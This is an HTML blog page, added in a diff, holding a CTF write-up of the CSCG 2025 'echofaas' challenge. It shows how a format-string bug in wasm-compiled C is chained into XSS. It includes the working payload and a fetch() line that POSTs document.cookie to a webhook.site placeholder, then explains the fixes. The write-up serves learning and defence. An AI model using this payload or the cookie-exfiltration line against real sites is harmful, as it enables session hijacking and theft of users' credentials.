@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+<head>
+    <meta charset="UTF-8">
+    <title>Cscg - &#x27;Echofaas&#x27;</title>
+    <link rel="stylesheet" href="/style.css">
+    <meta name="color-scheme" content="dark light">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="alternate" type="application/atom+xml" title="Computerdores (Atom)" href="https://jann.stute.dev/atom.xml">
+    <link rel="alternate" type="application/rss+xml" title="Computerdores (RSS)" href="https://jann.stute.dev/rss.xml">
+    <!-- Extras -->
+    <meta name="robots" content="index, follow">
+    <meta name="viewport" content="width=device-width, inital-scale=1">
+    <link rel="canonical" href="https:&#x2F;&#x2F;jann.stute.dev&#x2F;writeups&#x2F;cscg-echofaas&#x2F;">
+    
+    <meta name="title" content="Cscg - &#x27;Echofaas&#x27;">
+    <meta name="description" content="A writeup for the &#x27;echofaas&#x27; challenge from the CSCG 2025.">
+    
+    
+
+<link rel="stylesheet" href="/syntax.css">
+
+</head>
+
+<body>
+    <header>
+        <h1>Computerdores</h1>
+        <nav>
+            [<a href="https://jann.stute.dev">home</a>]
+            [<a href="https://jann.stute.dev/blog/">blog</a>]
+            [<a href="https://jann.stute.dev/writeups/">writeups</a>]
+            [<a href="https://jann.stute.dev/guestbook/">guestbook</a>]
+            [<a href="https://jann.stute.dev/about/">about</a>]
+        </nav>
+    </header>
+
+    <main>
+        
+<h1>CSCG - &#x27;echofaas&#x27;</h1>
+<p><b>Written: 2025-05-01</b></p>
+
+<p><b>Last Updated: 2025-09-06</b></p>
+
+<hr>
+<blockquote>
+<p>Everyone is talking about how cool Function as a Service is, therefore i made my own blazing fast echo function as a service using wasm.</p>
+<p>Note: The flag is stored in the admin bot cookie. <code>https://{sessionid}-80-echofaas.challenge.cscg.live:1337</code></p>
+</blockquote>
+<p><strong>Author:</strong> gfelber</p>
+<p><strong>Difficulty:</strong> Medium</p>
+<p><strong>Categories:</strong> pwn</p>
+<p><strong>Flag:</strong> <code>dach2025{th3_future_0f_w3b_1s_pwn_&lt;unique_hex_id&gt;}</code></p>
+<h1 id="recon">Recon</h1>
+<p>For this challenge we get the following small C program together with a Makefile which builds it for execution in a web browser:</p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>stdio.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>string.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
+</span></span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-meta z-preprocessor z-macro z-c"><span class="z-keyword z-control z-import z-define z-c">#define</span></span><span class="z-meta z-preprocessor z-macro z-c"> <span class="z-entity z-name z-constant z-preprocessor z-c">MSG_SIZE</span></span><span class="z-meta z-preprocessor z-macro z-c"> <span class="z-constant z-numeric z-integer z-hexadecimal z-c"><span class="z-punctuation z-definition z-numeric z-base z-c">0x</span>1000</span></span>
+</span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-storage z-type z-c">char</span> rmsg<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>MSG_SIZE<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>Hello, <span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-storage z-modifier z-c">static</span> <span class="z-storage z-type z-c">void</span> <span class="z-meta z-function z-c"><span class="z-entity z-name z-function z-c">sanitize</span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span><span class="z-variable z-parameter z-c">buf</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-meta z-function z-c"> </span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-storage z-type z-c">int</span> i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span> i <span class="z-keyword z-operator z-comparison z-c">&lt;</span> <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">strlen</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">buf</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span> <span class="z-keyword z-operator z-arithmetic z-c">++</span>i<span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>buf<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>&lt;<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">      buf<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span> <span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span></span>
+</span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span><span class="z-meta z-function z-c"><span class="z-entity z-name z-function z-c">echo</span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span><span class="z-variable z-parameter z-c">msg</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-meta z-function z-c"> </span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-storage z-type z-c">int</span> rmsg_len <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">strlen</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">rmsg</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">sanitize</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">msg</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">snprintf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">rmsg <span class="z-keyword z-operator z-arithmetic z-c">+</span> rmsg_len<span class="z-punctuation z-separator z-c">,</span> MSG_SIZE <span class="z-keyword z-operator z-arithmetic z-c">-</span> rmsg_len<span class="z-punctuation z-separator z-c">,</span> msg</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-keyword z-control z-flow z-return z-c">return</span> rmsg<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span></span>
+</span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-storage z-type z-c">int</span> <span class="z-meta z-function z-c"><span class="z-entity z-name z-function z-c">main</span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-meta z-function z-c"> </span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"> <span class="z-keyword z-control z-flow z-return z-c">return</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span> </span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span></span>
+</span></code></pre>
+<p>As we can see, it exposes a function called <code>echo</code> which returns what it is given, after filtering out all '<code>&lt;</code>' characters.
+However, there is also an immediate red flag here: the user input gets used as a format string with the only filtering that is applied beforehand not restricting the use of format string specifiers at all.
+But before we investigate that further, let's see what is passed into this function and how the output is used, after all, there might be additional filtering or the output might not be used in a such way that potentially circumventing the '<code>&lt;</code>' filtering would be a problem.</p>
+<p>Taking a quick look at the web page two things stand out:</p>
+<ol>
+<li>There is a report page where a URL can be reported, presumably causing the admin to visit it in a web browser which would enable us to exploit any XSS vulnerability we might find.</li>
+<li>There is a javascript snippet which both modifies the DOM Tree and uses a value from the URL - a potential XSS vector.</li>
+</ol>
+<p>Said javascript snippet is the following:</p>
+<pre data-lang="js" class="language-js z-code"><code class="language-js" data-lang="js"><span class="z-source z-ts"><span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">echo</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-promise z-ts">then</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-function z-expression z-ts"><span class="z-storage z-type z-function z-ts">function</span> <span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-variable z-parameter z-ts">Module</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">queryString</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-support z-variable z-dom z-ts">window</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">location</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">search</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">urlParams</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-new z-expr z-ts"><span class="z-keyword z-operator z-new z-ts">new</span> <span class="z-entity z-name z-type z-ts">URLSearchParams</span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">queryString</span><span class="z-meta z-brace z-round z-ts">)</span></span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">getElementById</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>banner<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">innerHTML</span> <span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">Module</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">ccall</span></span><span class="z-meta z-brace z-round z-ts">(</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">        <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>echo<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">        <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>string<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-array z-literal z-ts">        <span class="z-meta z-brace z-square z-ts">[</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>string<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-square z-ts">]</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-array z-literal z-ts">        <span class="z-meta z-brace z-square z-ts">[</span><span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">urlParams</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">get</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>msg<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span> <span class="z-keyword z-operator z-logical z-ts">||</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span><span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-square z-ts">]</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-expression z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></code></pre>
+<p>We can see that the <code>msg</code> parameter is taken from the URL and, <em>without any addition filtering</em>, passed to the echo function from earlier.
+This already means that the format string vulnerability in the C program can be triggered by us.</p>
+<p>The output from the echo function is then used to set the <code>innerHTML</code> of an element in the DOM Tree, meaning that there is potential for an XSS vulnerability here, because if the echo function can be manipulated to return an HTML script tag, a broken image with an <code>onerror</code> handler, or something similar, then malicious javascript could be executed if a victim visits a link crafted by an attacker.</p>
+<h1 id="planning-the-exploit">Planning the Exploit</h1>
+<p>To recap: The payload must not contain '<code>&lt;</code>', but the <code>echo</code> function must still return a valid HTML tag which requires at least one '<code>&lt;</code>' character.
+Thus we need to exploit the format string vulnerability to introduce a '<code>&lt;</code>' character into the output.</p>
+<p>After looking at the <code>printf(3)</code> man page, the interesting part of the syntax for format string specifiers boils down to this:</p>
+<pre class="z-code"><code><span class="z-text z-plain">%[argument$][width][length modifier]conversion
+</span></code></pre>
+<p><code>conversion</code> is interesting, because there is the little known <code>n</code> specifier which allows us use an argument as a pointer and to write the number of characters that have been printed so far to that pointer, thus giving us a limited ability to write memory.
+Furthermore, there are the <code>s</code> and <code>S</code> specifiers which allow use to print strings from memory.
+These specifiers will be the basis of the exploit, because we will try to:</p>
+<ol>
+<li>
+<p>print 60 characters (the ascii code for '<code>&lt;</code>')</p>
+</li>
+<li>
+<p>use the <code>n</code> specifier to store that count in memory</p>
+</li>
+<li>
+<p>print that count as a character</p>
+</li>
+</ol>
+<p>This way we should be to introduce '<code>&lt;</code>' into the output <em>after</em> that character was filtered out previously.</p>
+<p><code>[argument$]</code> allows use to use arguments out of order, which will make it simpler to print a precise number of characters.
+However there "may be no gaps in the numbers of arguments specified using '$';" (see '<code>man 3 printf</code>'), meaning if we use the second argument this way, we also need to use the first argument this way.</p>
+<p><code>[width]</code> is useful, because it allows us to specify how long the printed value should be. This means we can make a smaller payload, because instead of writing 30 arbitrary characters we can use something like '<code>%30i</code>' to print 30 characters.
+In the real world this would be useful, because it would make the malicously crafted URL shorter and thus less suspicious, for us it is useful because it makes this writeup nicer to read :)</p>
+<p>Finally, the <code>[length modifier]</code> allows us to specify the bit size of the argument.
+Why this is useful will become apparent later, but for now just keep in mind that it exists.</p>
+<h1 id="crafting-the-payload">Crafting the Payload</h1>
+<p>With this knowledge we can start crafting the payload.
+The first part of the payload is rather simple just '<code>%1$ 60d</code>' to print 60 arbitrary characters in order to prepare for writing to memory.</p>
+<p>The second step is a little more complicated: We need to figure out which values are being passed to <code>snprintf</code> as the arguments, because the C program doesn't specify any arguments, so these values will just be whatever is left over from previous operations.
+We need to know these values, because to write to a memory adress we need to select an argument which is a valid address.
+In order to do this we can simply use a format string like '<code>%d;%d;%d;%d;</code>' as our payload and we will be greeted by web page telling us the values that the arguments have.
+Looking at these values the situation is rather simple: The first three arguments are all out of bounds and all the values after that are zero. Thus, with zero being the only valid memory address out of the bunch, we choose the fourth argument for writing our character to memory.
+Therefore, our payload now looks like this:</p>
+<pre class="z-code"><code><span class="z-text z-plain">%1$ 60d%4$n
+</span></code></pre>
+<p>Next, we need to read the value from memory and print it as a character.
+The format specifier you would normally use for this is <code>s</code>, however, trying to do this here will only print '<code>(null)</code>' because the address is <code>0</code>.
+At this point I started looking at the way that <code>snprintf</code> is <a href="https://github.com/emscripten-core/emscripten/blob/99b77d04f9bf8857673e2c909c58030b8a3e45f9/system/lib/libc/musl/src/stdio/vfprintf.c#L482">implemented in emscripten</a>, the compiler used by the Makefile, to look for a way to circumvent this behaviour.
+What I found was that the other specifier for printing strings, <code>S</code>, which prints wide chars does not have this check at all.
+So, we can use '<code>%4$S</code>' to print the '<code>&lt;</code>' from address <code>0</code> without having it print '<code>(null)</code>' instead, which leads us to this payload:</p>
+<pre class="z-code"><code><span class="z-text z-plain">%1$ 60d%4$n%4$S
+</span></code></pre>
+<p>Trying out this new version of the payload shows a new problem however.
+Because while the first wide char is indeed '<code>&lt;</code>' as intended the second one is not printable which causes an exception and leads to nothing being printed.
+This is where the <code>[length modifier]</code> I mentioned earlier comes in handy.
+This is because each character is stored at a 4 byte offset from the last one, so we can use <code>ll</code> when writing '<code>&lt;</code>' to memory, which will write 8 bytes, and because of the endianness the first character will then still be '<code>&lt;</code>', but the second character will have been overwritten with a null byte which is the string terminator.
+After applying this change, our paylod now looks like this:</p>
+<pre class="z-code"><code><span class="z-text z-plain">%1$ 60d%4$lln%4$S
+</span></code></pre>
+<p>Now we can add what is necessary to build an <code>img</code> with an <code>onerror</code> handler, like this:</p>
+<pre class="z-code"><code><span class="z-text z-plain">%1$ 60d%4$lln%4$Simg src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;
+</span></code></pre>
+<p>Finally we just need to add '<code>%2$c%3$c</code>' at the end in order to satisfy the requirement that there be no gaps in the arguments used with the <code>$</code>-notation. So, we now have a working proof of concept (note that this, of course, needs to be url encoded and added as the URL parameter <code>msg</code>):</p>
+<pre class="z-code"><code><span class="z-text z-plain">%1$ 60d%4$lln%4$Simg src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt; %2$c%3$c
+</span></code></pre>
+<h1 id="getting-the-flag">Getting the Flag</h1>
+<p>At this point, getting the flag is quite simple. We can just replace the <code>alert(1)</code> with a js payload to extract the cookies, like this one:</p>
+<pre data-lang="js" class="language-js z-code"><code class="language-js" data-lang="js"><span class="z-source z-ts"><span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">fetch</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-single z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&#39;</span>https://webhook.site/&lt;insert_uuid_here&gt;<span class="z-punctuation z-definition z-string z-end z-ts">&#39;</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">method</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-single z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&#39;</span>POST<span class="z-punctuation z-definition z-string z-end z-ts">&#39;</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">mode</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-single z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&#39;</span>no-cors<span class="z-punctuation z-definition z-string z-end z-ts">&#39;</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">body</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">cookie</span></span><span class="z-punctuation z-definition z-block z-ts">}</span></span><span class="z-meta z-brace z-round z-ts">)</span>
+</span></code></pre>
+<p>And then we head to <code>/report</code> and submit the URL with our encoded payload, which, as mentioned earlier, will lead to an admin visiting that URL and to our js payload being executed.
+After that, we can observe a POST request, with the flag in the request body, being made to the URL from the payload.</p>
+<h1 id="fixing-the-vulnerabilities">Fixing the Vulnerabilities</h1>
+<p>There are two security related issues here that should be fixed:</p>
+<ol>
+<li>
+<p>The usage of <code>snprintf</code> with user input as the format string.</p>
+</li>
+<li>
+<p>The usage of <code>innerHTML</code> with (improperly) filtered user input.</p>
+</li>
+</ol>
+<p>Fixing the format string vulnerability is quite simple, as the call to <code>snprintf</code> could easily be replaced by a call to <code>memcpy</code> which would completely eliminate the format string vulnerability without any change in the normal behaviour of <code>echo</code>.</p>
+<p>Fixing the way that the user input is added into the DOM Tree is similarly simple, as the usage of <code>innerHTML</code> could simply be replaced with <code>innerText</code> which does not attempt to parse the input as HTML.
+In scenarios where the user should be able to use certain HTML tags, this would be more complicated, because proper filtering would be necessary.
+In this case however no filtering is necessary as long as <code>innerText</code> is used instead.</p>
+
+
+    </main>
+
+    <footer>
+        <hr>
+        <p>
+            <span>[<a href="https://jann.stute.dev/privacy/">privacy</a>]</span>
+            <span>[<a href="https://darktheme.club/">Proud member of darktheme.club</a>]</span>
+            <span>[<a href="https://jeffhuang.com/designed_to_last/">This page was designed to last</a>]</span>
+            <span>[<a href="https://www.getzola.org/">Built using Zola</a>]</span>
+            <span>[<a href="https://github.com/Computerdores/computerdores.github.io">Source Code available on GitHub</a>]</span>
+        </p>
+    </footer>
+</body>
+
+</html>
